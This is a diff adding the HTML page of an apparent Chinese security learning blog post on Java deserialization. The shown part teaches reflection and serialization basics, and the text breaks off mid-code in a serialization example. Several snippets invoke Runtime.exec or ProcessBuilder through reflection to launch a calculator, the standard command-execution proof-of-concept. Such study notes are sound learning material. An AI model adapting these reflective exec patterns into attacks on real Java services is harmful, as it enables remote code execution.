@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="。这下从零开始了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java的反序列化笔记">
+<meta property="og:url" content="https://southsea.st/Study-Unserialize-Java/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="。这下从零开始了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://southsea.st/images/Study-Unserialize-Java/1.png">
+<meta property="og:image" content="https://southsea.st/images/Study-Unserialize-Java/3.gif">
+<meta property="og:image" content="https://southsea.st/images/Study-Unserialize-Java/webp">
+<meta property="article:published_time" content="2022-02-01T16:30:45.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.075Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://southsea.st/images/Study-Unserialize-Java/1.png">
+
+
+<link rel="canonical" href="https://southsea.st/Study-Unserialize-Java/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Study-Unserialize-Java/","path":"Study-Unserialize-Java/","title":"Java的反序列化笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java的反序列化笔记 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">前置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84"><span class="nav-number">2.</span> <span class="nav-text">反射</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-class-%E5%AE%9E%E4%BE%8B"><span class="nav-number">2.1.</span> <span class="nav-text">获取 Class 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E7%B1%BB%E5%90%8D"><span class="nav-number">2.1.1.</span> <span class="nav-text">根据类名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.1.2.</span> <span class="nav-text">根据对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E5%85%A8%E9%99%90%E5%AE%9A%E7%B1%BB%E5%90%8D"><span class="nav-number">2.1.3.</span> <span class="nav-text">根据全限定类名</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fornamestring-classname"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">forName(String className)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fornamestring-name-boolean-initialize-classloader-loader"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">forName(String
+name, boolean initialize, ClassLoader loader)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.</span> <span class="nav-text">实例化操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#newinstance"><span class="nav-number">2.2.1.</span> <span class="nav-text">newInstance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getmethod"><span class="nav-number">2.2.2.</span> <span class="nav-text">getMethod</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getconstructor"><span class="nav-number">2.2.3.</span> <span class="nav-text">getConstructor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getdeclaredmethod"><span class="nav-number">2.2.4.</span> <span class="nav-text">getDeclaredMethod</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getdeclaredconstructor"><span class="nav-number">2.2.5.</span> <span class="nav-text">getDeclaredConstructor</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">3.1.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BE%85%E5%AE%8C%E5%96%84hashmap%E7%9B%B8%E5%85%B3"><span class="nav-number">3.2.</span> <span class="nav-text">待完善【HashMap相关——</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jdni"><span class="nav-number">4.</span> <span class="nav-text">JDNI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rmi"><span class="nav-number">4.1.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F"><span class="nav-number">4.1.1.</span> <span class="nav-text">代理模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F"><span class="nav-number">4.1.2.</span> <span class="nav-text">工厂模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E6%9C%8D%E5%8A%A1%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.1.3.</span> <span class="nav-text">正常服务实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.1.4.</span> <span class="nav-text">攻击实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#codebase%E6%8F%90%E4%B8%80%E5%98%B4"><span class="nav-number">4.1.5.</span> <span class="nav-text">Codebase提一嘴</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="nav-number">4.1.5.1.</span> <span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">4.1.5.2.</span> <span class="nav-text">示例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#server"><span class="nav-number">4.1.5.2.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#client"><span class="nav-number">4.1.5.2.2.</span> <span class="nav-text">Client</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#evilserver"><span class="nav-number">4.1.5.2.3.</span> <span class="nav-text">EvilServer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="nav-number">4.1.5.2.4.</span> <span class="nav-text">结果</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ldap"><span class="nav-number">4.2.</span> <span class="nav-text">LDAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Study-Unserialize-Java/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java的反序列化笔记 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java的反序列化笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-01 16:30:45" itemprop="dateCreated datePublished" datetime="2022-02-01T16:30:45+00:00">2022-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>。这下从零开始了。</p>
+<span id="more"></span>
+<h1 id="前置">前置</h1>
+<p><strong><a href="./Study-Java-IO">复习 Java 的 IO
+相关</a></strong></p>
+<h1 id="反射">反射</h1>
+<p><strong>Java</strong>
+的反射是指程序在运行期可以拿到一个对象的所有信息，是为了解决在运行期，对某个对象一无所知的情况下，对其方法进行调用。</p>
+<p><strong>Java</strong> 中的所有类都表现为 <strong>class</strong>
+对象，包括 <strong>8</strong> 种基本类和 <strong>interface</strong>
+等。</p>
+<p>而 <strong>class</strong> 对象是 <strong>JVM</strong>
+在执行过程中动态加载的，每加载一种
+<strong>class</strong>，<strong>JVM</strong> 便创建一个
+<strong>Class</strong> 实例与其关联，并在该实例中保留了该
+<strong>class</strong> 的所有信息，包括类名，接口，方法等。因此获得了
+<strong>Class</strong> 实例，便可获得与其关联的 <strong>class</strong>
+的所有信息。</p>
+<blockquote>
+<p>这里的 <strong>Class</strong> 是名为 <strong>Class</strong> 的
+<strong>class</strong>，只有 <strong>JVM</strong> 可以创建
+<strong>Class</strong>，自己编写的程序不行。</p>
+</blockquote>
+<h2 id="获取-class-实例">获取 Class 实例</h2>
+<p>获取 <strong>Class</strong> 实例的方法有 <strong>3</strong> 种：</p>
+<h3 id="根据类名">根据类名</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure>
+<h3 id="根据对象">根据对象</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">south</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> south.getClass();</span><br></pre></td></tr></table></figure>
+<h3 id="根据全限定类名">根据全限定类名</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>而由于 <strong>Class</strong> 是唯一的，因此上述方法获得的
+<strong>cls</strong> 是相等的。</p>
+<p>对于 <strong>forName</strong> 方法，有 <strong>2</strong>
+个函数重载，其关系从源码便可一眼看出。</p>
+<h4 id="fornamestring-classname">forName(String className)</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4
+id="fornamestring-name-boolean-initialize-classloader-loader">forName(String
+name, boolean initialize, ClassLoader loader)</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize, ClassLoader loader) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Reflective call to get caller class is only needed if a security manager</span></span><br><span class="line">        <span class="comment">// is present.  Avoid the overhead of making this call otherwise.</span></span><br><span class="line">        caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">if</span> (sun.misc.VM.isSystemDomainLoader(loader)) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> ClassLoader.getClassLoader(caller);</span><br><span class="line">            <span class="keyword">if</span> (!sun.misc.VM.isSystemDomainLoader(ccl)) &#123;</span><br><span class="line">                sm.checkPermission(</span><br><span class="line">                        SecurityConstants.GET_CLASSLOADER_PERMISSION);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> forName0(name, initialize, loader, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的 <strong>initialize</strong>
+变量并不表示着常规构造函数的初始化与否，而是类静态代码块的初始化与否，即
+<strong>static{}</strong> 中间的内容。</p>
+<p>值得一提的是，对于普通类中的内部类，是可以和普通类看作两个无关类的，其编译会生成两个文件。</p>
+<p>使用 <strong>$</strong> 符号来查找加载内部类，比如
+<strong>Class.forName("C1$C2")</strong>。</p>
+<h2 id="实例化操作">实例化操作</h2>
+<p>获取<strong>Class</strong>后，可以继续反射获得类中的成员变量等信息，也可以对其进行实例化。</p>
+<h3 id="newinstance">newInstance</h3>
+<ol type="1">
+<li>需要存在无参构造函数</li>
+<li>需要存在公开成员变量</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure>
+<h3 id="getmethod">getMethod</h3>
+<ol type="1">
+<li><strong>getMethod</strong>
+获取的需要是公开方法，包括从父类继承的</li>
+<li>后跟传参类型来确定重载的方法</li>
+<li><strong>invoke</strong> 对普通方法传入实例，对静态方法传入
+<strong>null</strong>，后跟传参的值</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="getconstructor">getConstructor</h3>
+<ol type="1">
+<li>没有无参构造时可用</li>
+<li>同样借助传参类型来确定重载方法</li>
+<li>对于可变长参数可传数组类来确定</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator&quot;</span>)));</span><br></pre></td></tr></table></figure>
+<h3 id="getdeclaredmethod">getDeclaredMethod</h3>
+<ol type="1">
+<li>获取的包括私有方法，但不包括从父类基础的，其余的雷同
+<strong>getMethod</strong></li>
+<li>获取私有方法后需要 <strong>setAccessible(true)</strong></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(method.invoke(clazz), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="getdeclaredconstructor">getDeclaredConstructor</h3>
+<ol type="1">
+<li>获取的包括私有方法，但不包括从父类基础的，其余的雷同
+<strong>getConstructor</strong></li>
+<li>获取私有方法后需要 <strong>setAccessible(true)</strong></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(constructor.newInstance(), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>此处 <strong>class</strong> 写为 <strong>clazz</strong>，是因为
+<strong>class</strong> 为关键字，故 <strong>Class</strong>
+类的实例化命名 <strong>class</strong> 会报错，常规是命名为
+<strong>clazz</strong>。</p>
+</blockquote>
+<h2 id="总结">总结</h2>
+<ol type="1">
+<li>反射使用软引用 <strong>relectionData</strong> 缓存
+<strong>class</strong> 信息，避免每次重新从 <strong>JVM</strong>
+获取带来的开销；</li>
+<li>反射调用多次生成新代理 <strong>Accessor</strong>,
+而通过字节码生存的则考虑了卸载功能，所以会使用独立的类加载器；</li>
+<li>当找到需要的方法，都会 <strong>copy</strong>
+一份出来，而不是使用原来的实例，从而保证数据隔离；</li>
+<li>调度反射方法，最终是由 <strong>JVM</strong> 执行
+<strong>invoke0()</strong> 执行；</li>
+<li>在 <strong>JVM</strong> 运行时如果存在有
+<strong>SecurityManager</strong>，那么根据规则，可能会阻止
+<strong>setAccessible(true)</strong> 来保证 <strong>JVM</strong>
+核心库的安全。</li>
+<li>反射调用时遵循多态原则，优先调用覆盖写法。</li>
+</ol>
+<h1 id="序列化与反序列化">序列化与反序列化</h1>
+<p>在网络上传递消息的时候一般会用一些格式化的标准，比如
+<strong>Json/XML</strong>，但其不支持复杂的数据类型。</p>
+<p>因此，<strong>Jackson/Fastjson</strong> 等类库，会在
+<strong>Json/XML</strong>
+的基础上进行改造，通过特定的语法来传递对象；亦或者如
+<strong>RMI</strong>，直接使用 <strong>Java</strong>
+等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输。</p>
+<p>而在 <strong>Java</strong> 中，<strong>ObjectOutputStream</strong>
+类的 <strong>writeObject()</strong>
+方法用于将对象转成二进制数据实现序列化。<strong>ObjectInputStream</strong>
+类的 <strong>readObject()</strong>
+方法用于将二进制数据转成对象实现反序列化。</p>
+<p>序列化条件</p>
+<ul>
+<li>需要该类实现 <strong>Serializable/Externalizable</strong> 接口</li>
+</ul>
+<p>反序列化条件</p>
+<ul>
+<li>存在指定的类</li>
+<li><strong>serialVersionUID</strong> 一致</li>
+</ul>
+<h2 id="例子">例子</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span 